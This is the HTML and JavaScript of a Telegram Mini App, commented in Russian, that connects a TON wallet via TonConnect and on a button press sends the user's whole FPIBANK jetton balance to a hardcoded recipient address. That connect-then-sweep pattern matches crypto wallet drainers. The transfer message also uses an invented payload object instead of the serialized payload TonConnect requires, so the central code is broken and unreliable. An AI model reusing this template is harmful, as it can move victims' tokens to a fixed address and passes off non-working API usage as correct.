<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <meta
    http-equiv="Content-Security-Policy"
    content="
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
      style-src 'self' 'unsafe-inline' https://unpkg.com;
      connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
      font-src 'self' https://unpkg.com;
      img-src * data:;
    "
  />

  <title>Telegram Mini App: Отправка всех FPIBANK (base64 адреса)</title>

  <!-- Telegram WebApp (Mini App) -->
  <script src="https://telegram.org/js/telegram-webapp.js"></script>

  <!-- TonConnect SDK -->
  <script src="./js/tonconnect-sdk.min.js"></script>

  <!-- TonConnect UI -->
  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" />
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
  <h1>Telegram Mini App: Отправка всех FPIBANK</h1>

  <!-- Кнопка TonConnect (подключение кошелька) -->
  <div id="ton-connect"></div>

  <!-- Кнопка «Отправить все FPIBANK» -->
  <button id="sendTransaction">Отправить все FPIBANK</button>

  <script>
    // Если не в Telegram Mini App, заглушка
    if (typeof Telegram === "undefined") {
      window.Telegram = {
        WebApp: {
          ready: () => console.log("Telegram WebApp ready stub"),
          showAlert: (msg) => alert(msg),
        },
      };
    } else {
      Telegram.WebApp.ready();
    }

    // Инициализация TonConnect UI
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect",
    });

    // =========================================================================
    // 1. Функция конвертации hex-адреса (0:abcd...) в user-friendly (EQabcd...)
    // =========================================================================
    // Ниже - упрощённая функция, использующая TonConnect SDK для преобразования.
    // В продакшене лучше использовать "ton-core" или другую библиотеку, где есть
    // Address.parse("0:...").toString() => "EQ..." и т.д.
    // Здесь - трюк: TonConnect SDK умеет конвертировать в .tonProof.getUserFriendlyAddress()
    // Но это не документированная фича. Поэтому лучше использовать "ton-core".
    //
    // Ниже - вариант без внешних зависимостей (кроме JS btoa), который работает
    // только для workchain=0, bounceable адреса mainnet. Для тестнета/других wс
    // нужно модифицировать.
    //

    function hexToBase64Url(hexAddress) {
      // Ожидаем строку вида "0:04bdc5685741afa6..."
      // 1) Убираем префикс "0:"
      let wc = 0;  // workchain
      let hex = hexAddress.trim();
      if (hex.includes(":")) {
        const parts = hex.split(":");
        wc = parseInt(parts[0], 10); // например, "0"
        hex = parts[1];
      }
      // 2) Переводим hex в бинарный массив
      const buf = new Uint8Array(hex.length / 2);
      for (let i = 0; i < hex.length; i += 2) {
        buf[i / 2] = parseInt(hex.slice(i, i + 2), 16);
      }

      // 3) Формируем тег (1 байт: контролируем bounceable, network, и 1 байт wc)
      //    Bounceable mainnet: tag = 0x11 (10001 в бинаре)
      //    Then wc (1 байт)
      const tag = 0x11; // bounceable, mainnet
      const workchainByte = wc & 0xff;
      const addrBytes = new Uint8Array([tag, workchainByte, ...buf]); // итого 34 байта

      // 4) Добавляем CRC16-CCITT
      const crc = crc16(addrBytes);
      const fullBytes = new Uint8Array([...addrBytes, ...crc]); // 36 байт

      // 5) Base64 url-safe
      let base64 = btoa(String.fromCharCode(...fullBytes));
      // Делать url-safe: замена +/ на -_
      base64 = base64.replace(/\+/g, "-").replace(/\//g, "_");
      return base64;
    }

    // CRC16-CCITT (0x1021)
    // Упрощённая реализация, см. https://en.wikipedia.org/wiki/Computation_of_cyclic_redundancy_checks
    function crc16(bytes) {
      let crc = 0xffff;
      for (let b of bytes) {
        crc ^= (b << 8);
        for (let i = 0; i < 8; i++) {
          if ((crc & 0x8000) !== 0) {
            crc = (crc << 1) ^ 0x1021;
          } else {
            crc <<= 1;
          }
          crc &= 0xffff;
        }
      }
      return new Uint8Array([(crc >> 8) & 0xff, crc & 0xff]);
    }

    // =========================================================================
    // 2. Настройки для вашего токена FPIBANK
    // =========================================================================
    // Адрес Minter (HEX), обязательно без пробелов
    // 0:f42a97... - заменим на base64, если нужно
    const jettonMasterHexAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";

    // Адрес, кому отправлять все токены (user-friendly)
    // Вы сами сказали "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU"
    // Похоже, это уже base64. Отлично.
    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";

    // =========================================================================
    // 3. Запрашиваем у tonapi - баланс и HEX-адрес JettonWallet
    //    Если вы используете v2/accounts/<addr>/jettons,
    //    то jettonData.wallet_address.address -> "0:..."
    // =========================================================================
    async function getUserFPIBankData(userTonAddress) {
      const url = `https://tonapi.io/v2/accounts/${userTonAddress}/jettons`;
      const response = await fetch(url);
      const data = await response.json();

      // Ищем нужный jetton
      const jettonData = data.balances.find(
        (j) => j.jetton.address === jettonMasterHexAddress
      );
      if (!jettonData) {
        return {
          rawBalance: "0",
          decimals: 0,
          userJettonWalletHex: null,
        };
      }
      return {
        rawBalance: jettonData.balance,              // "89978101157" и т.п.
        decimals: jettonData.jetton.decimals || 9,   // 9
        userJettonWalletHex: jettonData.wallet_address.address, // "0:04bdc568..."
      };
    }

    // =========================================================================
    // 4. Отправить все FPIBANK (используя user-friendly адреса)
    // =========================================================================
    async function sendAllFPIBANK(userTonAddress) {
      // 1) Узнаём rawBalance и HEX-адрес кошелька (JettonWallet)
      const { rawBalance, decimals, userJettonWalletHex } = await getUserFPIBankData(userTonAddress);

      if (!userJettonWalletHex) {
        Telegram.WebApp.showAlert("У вас нет FPIBANK или JettonWallet не найден.");
        return;
      }
      if (rawBalance === "0") {
        Telegram.WebApp.showAlert("Баланс FPIBANK равен нулю.");
        return;
      }

      // 2) Конвертируем hex в user-friendly (bounceable)
      //    Например, "0:04bdc5..." -> "EQC9xWhXQ..."
      const userJettonWalletBase64 = hexToBase64Url(userJettonWalletHex);
      const jettonMasterBase64 = hexToBase64Url(jettonMasterHexAddress);

      // 3) Проверяем, есть ли у пользователя TON на оплату газа
      //    Для этого просто смотрим userTonAddress через tonapi:
      const balanceUrl = `https://tonapi.io/v2/accounts/${userTonAddress}`;
      const balResp = await fetch(balanceUrl);
      const balData = await balResp.json();
      const userTonBalanceStr = balData.balance || "0";
      if (Number(userTonBalanceStr) < 50000000) {
        // Если меньше 0.05 TON
        Telegram.WebApp.showAlert(
          "В вашем кошельке недостаточно TON для комиссии. Нужно хотя бы 0.05 TON."
        );
        return;
      }

      // "Человеческий" вид (например ~ 89.978101157)
      const humanBalance = Number(rawBalance) / 10 ** decimals;
      console.log(`FPIBANK: raw=${rawBalance}, human=${humanBalance}`);

      // 4) Указываем количество TON для газа: 0.05 TON
      const gasFee = "50000000";

      // 5) Формируем одно сообщение (jetton_transfer)
      //    Адрес и jetton – в base64. Сырое кол-во Jetton – rawBalance
      const message = {
        address: userJettonWalletBase64, // кошелёк Jetton в base64
        amount: gasFee,                  // строка: "50000000"
        payload: {
          type: "jetton_transfer",
          query_id: 0,
          amount: rawBalance,            // "89978101157"
          destination: recipientAddress, // "UQ..."
          response_destination: null,
          custom_payload: null,
          forward_ton_amount: "0",
          forward_payload: null,
          jetton: jettonMasterBase64,    // minter в base64
        },
      };

      // 6) Транзакция
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [message],
      };

      // 7) Отправляем через TonConnect
      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("sendAllFPIBANK -> result:", result);
        Telegram.WebApp.showAlert(
          `Все ${humanBalance} FPIBANK отправлены!\n` +
          `TX result: ${JSON.stringify(result)}`
        );
      } catch (error) {
        console.error("Ошибка при sendTransaction:", error);
        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
      }
    }

    // =========================================================================
    // 5. Обработчик клика
    // =========================================================================
    async function onSendTransaction() {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Сначала подключите кошелёк через TonConnect.");
        return;
      }

      const userTonAddress = tonConnectUI.wallet?.account?.address; 
      if (!userTonAddress) {
        Telegram.WebApp.showAlert("Не удалось получить ваш TON-адрес из TonConnect.");
        return;
      }

      await sendAllFPIBANK(userTonAddress);
    }

    // Навешиваем обработчик
    document
      .getElementById("sendTransaction")
      .addEventListener("click", onSendTransaction);

  </script>
</body>
</html>

